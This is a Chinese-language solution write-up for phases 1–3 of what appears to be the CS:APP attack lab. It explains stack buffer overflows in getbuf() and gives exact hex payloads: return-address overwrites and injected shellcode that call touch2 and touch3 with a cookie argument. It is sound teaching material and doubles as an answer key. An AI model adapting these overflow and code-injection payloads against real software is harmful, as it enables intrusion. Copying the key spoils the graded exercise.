## phase1

```assembly
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp	# 字符串长度不超过40
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	call   401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	ret    
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

输入字符串超过40（包含结束的空字符）时溢出，污染ret要返回的指令地址。

touch1的地址是0x00000000004017c0

所以输入的字符串是40个任意字符后接着**c0 17 40 00 00 00 00 00**

例如

```
00 00 00 00 00 00 00 00 00 00   /* 10 zeros */
00 00 00 00 00 00 00 00 00 00   /* 10 zeros */
00 00 00 00 00 00 00 00 00 00   /* 10 zeros */
00 00 00 00 00 00 00 00 00 00   /* 10 zeros */
c0 17 40 00 00 00 00 00			/* address of <touch1> */
```



## phase_2

```c
void touch2(unsigned val)
{
    vlevel = 2; /* Part of validation protocol */
    if (val == cookie) {
	printf("Touch2!: You called touch2(0x%.8x)\n", val);
	validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

touch2的地址是0x00000000004017ec

cookie是0x59b997fa

刚进入getbuf时%rsp = 0x5561dca0，然后%rsp - 0x28 = 0x5561dc78

要注入的代码是

```assembly
68 ec 17 40 00       	pushq  $0x4017ec			# touch2的地址
48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa, %rdi	# 将cookie存入%rdi
c3                   	ret							# 返回到执行touch2
```

然后要注入代码使得getbuf执行ret时返回的地址为上面代码的起始位置，可以在输入的字符串中首先注入代码，然后填0，最后覆盖ret要返回的指令地址。

```assembly
5561dc78:	68 ec 17 40 00       	pushq  $0x4017ec			# touch2的地址
5561dc7d:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa, %rdi	# 将cookie存入%rdi
5561dc84:	c3                   	ret							# 返回到执行touch2
```

所以输入的字符串是

```
68 ec 17 40 00                  /* pushq $0x4017ec */
48 c7 c7 fa 97 b9 59            /* mov   $0x59b97fa, %rdi */
c3                              /* ret */
00 00 00 00 00 00 00            /* 7 zeros */
00 00 00 00 00 00 00 00 00 00   /* 10 zeros */
00 00 00 00 00 00 00 00 00 00   /* 10 zeros */
78 dc 61 55 00 00 00 00         /* address of gadget */
```



## phase_3

```c
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval)// val = 0x59b997fa, sval = %rdi
{
	char cbuf[110];
	/* Make position of check string unpredictable */
	char *s = cbuf + random() % 100;
	sprintf(s, "%.8x", val); //s = "59b997fa"
	return strncmp(sval, s, 9) == 0;
}

void touch3(char *sval)
{
	vlevel = 3; /* Part of validation protocol */
	if (hexmatch(cookie, sval)) {
		printf("Touch3!: You called touch3(\"%s\")\n", sval);
		validate(3);
	} else {
		printf("Misfire: You called touch3(\"%s\")\n", sval);
		fail(3);
	}
	exit(0);
}
```

在注入的字符串中加入sval应指向的字符串“59b997fa”

touch3的地址是0x00000000004018fa

gdb检查发现进入touch3时%rsp变为0x5561dca8，而注入的位置是0x5561dc78，相差0x30 == 48

进入hexmatch时%rsp变为0x5561dc98，栈扩大后变成0x5561dc00，且canary保证栈帧不超过0x78

所以要把sval字符串放远一点以免被touch3的栈帧内容覆盖(放在0x5561dca8及之后的位置)

要注入的代码是

```assembly
5561dc78:	68 fa 18 40 00       	pushq  $0x4018fa			# touch3的地址
5561dc7d:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8, %rdi	# 将字符串地址存入%rdi
5561dc84:	c3                   	ret							# 返回到执行touch3
#填0和address of gadget
5561dca8:	35 39 62 39 39 37 66 61 00							# sval字符串
```

要输入的字符串是

```
68 fa 18 40 00                  /* touch3的地址 */
48 c7 c7 a8 dc 61 55            /* 将sval字符串地址存入%rdi */
c3                              /* 返回到执行touch3 */
00 00 00 00 00 00 00            /* 7 zeros */
00 00 00 00 00 00 00 00 00 00   /* 10 zeros */
00 00 00 00 00 00 00 00 00 00   /* 10 zeros */
78 dc 61 55 00 00 00 00         /* address of gadget */
35 39 62 39 39 37 66 61 00      /* sval字符串 */
```

